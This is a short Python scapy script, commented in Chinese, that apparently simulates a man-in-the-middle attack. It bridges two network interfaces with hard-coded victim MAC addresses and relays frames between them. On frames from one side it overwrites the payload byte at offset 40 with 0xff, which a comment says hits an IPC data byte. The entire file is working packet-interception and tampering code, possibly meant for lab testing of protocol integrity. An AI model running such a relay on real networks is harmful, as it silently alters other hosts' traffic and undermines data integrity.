from scapy.all import *
import threading

# 该脚本用于模拟中间人攻击行为
# 定义中间人两端的网卡，以及中间人攻击的两端的直连网卡信息
terminal1 = {
    "interface": "ens34",     # 此处为中间人自身的网卡中，与被攻击者直接相连的
    "lladdr": "00:0c:29:83:1a:34"    # 此处为被攻击者的mac地址
}

terminal2 = {
    "interface": "ens37",
    "lladdr": "00:0c:29:eb:1f:1c"
}

# 从terminal1处接受的数据包，会在修改后发送给terminal2
# 从terminal2处接受的数据包，会直接转发给terminal1

# 设置需要中间人修改数据包的回调函数
def forward_packet(packet):
    if packet[Ether].src == terminal2["lladdr"]:
        packet[Ether].dst = terminal1["lladdr"]
        sendp(packet, iface=terminal1["interface"], verbose=False)
    return packet

def mitm_packet(packet):
    if packet[Ether].src == terminal1["lladdr"]:
        packet[Ether].dst = terminal2["lladdr"]

        if Raw in packet:
            raw_packet = packet[Raw].load
            # 检查数据包的长度是否大于 40 字节
            if len(raw_packet) > 40:
                # 修改偏移量为 40 字节的位置的字节为新的值()，对于增加了扩展报头的数据包来说，Raw 层偏移 40 字节后指向了一个 IPC 的数据字节
                modified_packet = raw_packet[:40] + b'\xff' + raw_packet[41:]
                packet[Raw].load = modified_packet

        sendp(packet, iface=terminal2["interface"], verbose=False)
    return packet

def main():
    def sniff_packets(iface, callback):
        sniff(iface=iface, prn=callback)

    # 开始捕获数据包并应用回调函数
    thread1 = threading.Thread(target=sniff_packets, args=(terminal1["interface"], mitm_packet))
    thread2 = threading.Thread(target=sniff_packets, args=(terminal2["interface"], forward_packet))
    
    # 启动线程
    thread1.start()
    thread2.start()

    # 等待线程结束
    thread1.join()
    thread2.join()

if __name__ == "__main__":
    main()
